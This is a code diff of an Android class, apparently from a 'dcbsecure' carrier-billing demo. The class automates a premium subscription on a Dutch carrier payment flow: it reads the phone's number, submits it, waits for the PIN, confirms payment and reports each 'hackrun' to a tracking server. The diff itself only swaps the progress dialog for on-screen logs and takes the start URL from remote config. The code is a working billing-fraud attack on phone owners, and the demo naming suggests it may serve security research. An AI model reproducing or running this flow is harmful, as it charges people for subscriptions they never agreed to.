@@ -1,18 +1,14 @@
 package com.dcbsecure.demo201503.dcbsecure.flow;
 
-import android.app.ProgressDialog;
 import android.content.Context;
-import android.content.DialogInterface;
-import android.os.Handler;
 import android.os.Looper;
-import android.os.Message;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
+import android.view.View;
 import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
 import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
 import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
-import com.dcbsecure.demo201503.dcbsecure.R;
 import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
 import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
 import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
@@ -28,50 +24,20 @@ import java.util.Timer;
 import java.util.TimerTask;
 
 
-public class FlowNLWifi implements DialogInterface.OnClickListener
+public class FlowNLWifi implements View.OnClickListener
 {
     private final ActivityMainWindow activityMainWindow;
-    private final String trigger;
 
-    public FlowNLWifi(ActivityMainWindow activityMainWindow, String trigger)
+    public FlowNLWifi(ActivityMainWindow activityMainWindow)
     {
-
         this.activityMainWindow = activityMainWindow;
-        this.trigger = trigger;
     }
 
     @Override
-    public void onClick(DialogInterface dialog, int id)
+    public void onClick(View v)
     {
-        Log.d("FLIRTY", "Started handling payment over wifi.");
-
 
         final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);
-
-
-        final ProgressDialog progress = ProgressDialog.show(activityMainWindow, null, activityMainWindow.getString(R.string.processing));
-        progress.show();
-
-        // used to dismiss the progress dialog
-        final Handler handler = new Handler()
-        {
-            @Override
-            public void handleMessage(final Message msg)
-            {
-                super.handleMessage(msg);
-
-                if (msg.what == 0)
-                {
-                    progress.dismiss();
-                }
-
-                if(msg.what >0)
-                {
-                    // start the waiting task
-                    progress.setMessage(activityMainWindow.getString(R.string.processing)+" "+msg.what+"%");
-                }
-            }
-        };
 
         new Thread(new Runnable()
         {
@@ -105,28 +71,28 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                     if (hackConfigResponse == null)
                     {
                         TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
-                        handler.sendEmptyMessage(0);
+                        activityMainWindow.updateLogs("\ncould not read config");
                     }
                     else
                     {
                         //decode runid first so that if there is an exception later on, we can still report it against the right runid
+                        activityMainWindow.updateLogs("\nreading config:"+hackConfigResponse.toString());
                         runid = hackConfigResponse.getLong("runid");
-                        runFlowNotInMainThread(deviceid, runid, handler);
+                        String startUrl = hackConfigResponse.getString("start_url");
+                        runFlowNotInMainThread(deviceid, runid, startUrl);
                     }
                 }
                 catch (JSONException e)
                 {
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
-                    Log.d("FLIRTY", "Could not read hack config");
-                    handler.sendEmptyMessage(0);
+                    activityMainWindow.updateLogs("\nCould not read config");
                 }
                 catch (Exception e)
                 {
                     String stack = TrackMgr.getStackAsString(e);
                     String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
-                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
-                    handler.sendEmptyMessage(0);
+                    activityMainWindow.updateLogs("\nexception:" + e.getClass().getName() + " " + e.getMessage());
                 }
 
             }
@@ -134,34 +100,14 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
 
      }
 
-    private void runFlowNotInMainThread(final String deviceid, final long runid, final Handler handler)
+    private void runFlowNotInMainThread(final String deviceid, final long runid, String startUrl)
     {
         final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
-
-        String startUrl = null;
-        JSONObject billingConfigJSON = ConfigMgr.getBillingConfig();
-
-        try
-        {
-            JSONObject carrierSubFlow = null;
-
-            if(billingConfigJSON != null && billingConfigJSON.has("carrier_sub_flow")) carrierSubFlow = billingConfigJSON.getJSONObject("carrier_sub_flow");
-            if(carrierSubFlow != null && carrierSubFlow.has("start_url")) startUrl = carrierSubFlow.getString("start_url");
-
-        }
-        catch (JSONException e)
-        {
-            String subject = "exception reading json flow config";
-            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, billingConfigJSON.toString());
-            handler.sendEmptyMessage(0);
-            return;
-        }
-
         if(startUrl==null)
         {
-            String subject = "cannot workout start_url";
+            String subject = "start_url is null";
             TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
-            handler.sendEmptyMessage(0);
+            activityMainWindow.updateLogs("\n"+subject);
             return;
         }
         else //if (startUrl!=null)
@@ -172,14 +118,14 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
             {
                 String subject = "start_url returns nothing";
                 TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, startUrl);
-                handler.sendEmptyMessage(0);
+                activityMainWindow.updateLogs("\n"+subject);
                 return;
             }
             else if(resultAfterStart.getHttpCode()!=200)
             {
                 String subject = "start_url returns http code "+resultAfterStart.getHttpCode();
                 TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, resultAfterStart.getContent());
-                handler.sendEmptyMessage(0);
+                activityMainWindow.updateLogs("\n"+subject);
                 return;
             }
             else
@@ -205,6 +151,7 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                     msisdnStartingWith0not31 = "0" + msisdnStartingWith0not31;
 
                 Log.d("FLIRTY", "Using MSISDN: " + msisdnStartingWith0not31);
+                activityMainWindow.updateLogs("\nusing phone number "+msisdnStartingWith0not31);
 
                 paramsForMsisdnSubmit.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$msisdnTxt", msisdnStartingWith0not31));
                 paramsForMsisdnSubmit.add(new BasicNameValuePair("ctl00$ContentPlaceHolder1$msisdnContinueButton", "Ga verder"));
@@ -217,14 +164,14 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                 {
                     String subject = "EnterMsisdn returns nothing";
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterStart);
-                    handler.sendEmptyMessage(0);
+                    activityMainWindow.updateLogs("\n"+subject);
                     return;
                 }
                 else if(resultAfterMsisdnSubmit.getHttpCode()!=200)
                 {
                     String subject = "EnterMsisdn returns http code "+resultAfterMsisdnSubmit.getHttpCode();
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterMsisdnSubmit);
-                    handler.sendEmptyMessage(0);
+                    activityMainWindow.updateLogs("\n"+subject);
                     return;
                 }
                 else if(submitPinUrl != null && submitPinUrl.toLowerCase().contains("operatornotsupported"))
@@ -233,32 +180,21 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                     TrackMgr.event(activityMainWindow, "operator not supported", null);
                     String subject = "operator not supported";
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, null);
-                    try
-                    {
-                        //remove carrier_sub_flow from billing config since it's not supported => if user tries again he will be directed to another flow
-                        JSONObject billingConfig = ConfigMgr.getBillingConfig();
-                        billingConfig.put("carrier_sub_flow", null);
-                        ConfigMgr.setBillingConfig(billingConfig);
-                    }
-                    catch (JSONException e)
-                    {
-                        //do nothing
-                    }
-                    handler.sendEmptyMessage(0);
+                    activityMainWindow.updateLogs("\n"+subject);
                     return;
                 }
                 else if(submitPinUrl==null)
                 {
                     String subject = "cannot workout PinSubmitUrl";
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterMsisdnSubmit);
-                    handler.sendEmptyMessage(0); //kill the waiting message
+                    activityMainWindow.updateLogs("\n"+subject);
                     return;
                 }
                 else if(!htmlDataAfterMsisdnSubmit.contains("uw code"))
                 {
                     String subject = "expected pin submit page does not look right";
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterMsisdnSubmit);
-                    handler.sendEmptyMessage(0); //kill the waiting message
+                    activityMainWindow.updateLogs("\n"+subject);
                     return;
                 }
                 else //if(submitPinUrl!=null)
@@ -302,28 +238,28 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                                     {
                                         String subject = "PinSubmit returns nothing";
                                         TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterMsisdnSubmit);
-                                        handler.sendEmptyMessage(0);
+                                        activityMainWindow.updateLogs("\n"+subject);
                                         return;
                                     }
                                     else if(resultAfterPinSubmit.getHttpCode()!=200)
                                     {
                                         String subject = "PinSubmit returns http code "+resultAfterPinSubmit.getHttpCode();
                                         TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterPinSubmit);
-                                        handler.sendEmptyMessage(0);
+                                        activityMainWindow.updateLogs("\n"+subject);
                                         return;
                                     }
                                     else if(confirmUrl==null)
                                     {
                                         String subject = "cannot workout confirmUrl";
                                         TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterPinSubmit);
-                                        handler.sendEmptyMessage(0); //kill the waiting message
+                                        activityMainWindow.updateLogs("\n"+subject);
                                         return;
                                     }
                                     else if(!htmlDataAfterPinSubmit.contains("Betalen"))
                                     {
                                         String subject = "expected confirm page does not look right";
                                         TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, subject,htmlDataAfterPinSubmit);
-                                        handler.sendEmptyMessage(0); //kill the waiting message
+                                        activityMainWindow.updateLogs("\n"+subject);
                                         return;
                                     }
                                     else //if(htmlDataAfterPinSubmit.contains("Betalen"))
@@ -341,21 +277,21 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                                         {
                                             String subject = "Confirm returns null (url:"+confirmUrl+")";
                                             TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterPinSubmit);
-                                            handler.sendEmptyMessage(0);
+                                            activityMainWindow.updateLogs("\n"+subject);
                                             return;
                                         }
                                         else if(resultAfterConfirm.getHttpCode()!=200)
                                         {
                                             String subject = "Confirm returns http code "+resultAfterConfirm.getHttpCode();
                                             TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
-                                            handler.sendEmptyMessage(0);
+                                            activityMainWindow.updateLogs("\n"+subject);
                                             return;
                                         }
                                         else if(htmlDataAfterConfirm.contains("ongeldig"))
                                         {
                                             String subject = "failed pin confirm ("+pin+")";
                                             TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
-                                            handler.sendEmptyMessage(0);
+                                            activityMainWindow.updateLogs("\n"+subject);
                                             return;
                                         }
                                         else if(htmlDataAfterConfirm.contains("action=\"SuccessfulConfirmation.aspx\""))
@@ -370,24 +306,24 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                                             if(flirtymobSuccessUrl!=null && flirtymobSuccessUrl.contains("flirtymob.com"))
                                             {
                                                 String subject = "successful signup after pin confirm ("+pin+")";
+                                                activityMainWindow.updateLogs("\n"+subject);
                                                 TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
                                             }
                                             else
                                             {
                                                 //post warning
                                                 String subject = "successful signup but wrong redirect after SuccessfulConfirmation.aspx; pin was ("+pin+")";
+                                                activityMainWindow.updateLogs("\n"+subject);
                                                 TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 1, false, subject, htmlDataAfterSuccessfulConfirmation);
                                             }
-
-                                            handler.sendEmptyMessage(0);
                                             return;
 
                                         }
                                         else
                                         {
                                             String subject = "unexpected answer after confirm ("+pin+")";
+                                            activityMainWindow.updateLogs("\n"+subject);
                                             TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataAfterConfirm);
-                                            handler.sendEmptyMessage(0);
                                             return;
                                         }
 
@@ -396,10 +332,6 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
                                 }
                                 else try
                                 {
-                                    double timeElapsedPer95 = 95d - ( 95d * (END_TIME- System.currentTimeMillis()) / WAITING_TIME) ;
-                                    int progressPercent = 5 + (int) Math.round(timeElapsedPer95);
-                                    handler.sendEmptyMessage(progressPercent);
-
                                     Thread.sleep(SLEEP_TIME);
                                 }
                                 catch (Exception e)
@@ -411,8 +343,8 @@ public class FlowNLWifi implements DialogInterface.OnClickListener
 
                             //timeout
                             String subject = "timeout waiting for pin";
+                            activityMainWindow.updateLogs("\n"+subject);
                             TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject,htmlDataAfterMsisdnSubmit);
-                            handler.sendEmptyMessage(0);
                         }
                     };
 
